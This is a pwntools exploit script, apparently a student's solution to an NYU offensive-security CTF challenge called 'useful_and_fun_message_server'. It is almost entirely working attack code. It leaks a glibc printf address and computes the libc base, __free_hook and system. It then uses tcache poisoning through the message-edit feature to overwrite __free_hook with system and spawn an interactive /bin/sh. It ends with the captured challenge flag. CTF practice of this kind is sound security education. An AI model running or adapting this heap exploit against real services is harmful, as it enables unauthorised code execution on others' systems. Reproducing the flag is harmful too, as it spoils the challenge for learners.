from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-f']

CHALLENGE = "./useful_and_fun_message_server"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1212
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

# p = gdb.debug(CHALLENGE, '''
#     b *(main+278)
#     b *(main+302)
#     b *(main+314)
#     continue
# ''')

def add_message(message):
    print(p.recvuntil(b"> ").decode())
    p.send(b"1")
    pprint(p.recvuntil(b"> ").decode())
    p.send(message)
    log.info(f"Adding a message: {message}")

def edit_message(index, message):
    print(p.recvuntil(b"> ").decode())
    p.send(b"3")
    print(p.recvuntil(b"> ").decode())
    p.send(str(index).encode())
    print(p.recvuntil(b"> ").decode())
    p.send(message)
    log.info(f"Editing the message at index: {index} with a new message: {message}")

def send_messages():
    print(p.recvuntil(b"> ").decode())
    p.send(b"4")
    log.info(f"Sending all messages")

# Stage 1: Calculate required addresses
print(p.recvuntil(b": ").decode())
glibc_printf_addr = u64(p.recvline().strip().ljust(8, b"\x00"))
log.info(f"Receiving glibc printf address: {hex(glibc_printf_addr)}")
glibc_e = ELF("libc.so.6")
glibc_base_addr = glibc_printf_addr - glibc_e.symbols.printf
glibc_free_hook_addr = glibc_base_addr + glibc_e.symbols.__free_hook
glibc_system_addr = glibc_base_addr + glibc_e.symbols.system

# Stage 2: Prepare for tcache poisoning
add_message(b"A"*0x8)
add_message(b"B"*0x8)
send_messages()

# Stage 3: Perform tcache poisoning
edit_message(1, p64(glibc_free_hook_addr))
add_message(b"/bin/sh\x00")
add_message(p64(glibc_system_addr))

# Stage 4: Trigger system("/bin/sh")
send_messages()

p.interactive()

# flag{Unb07h3r3d_AND_f0cus3d!_b882d127a661b586}
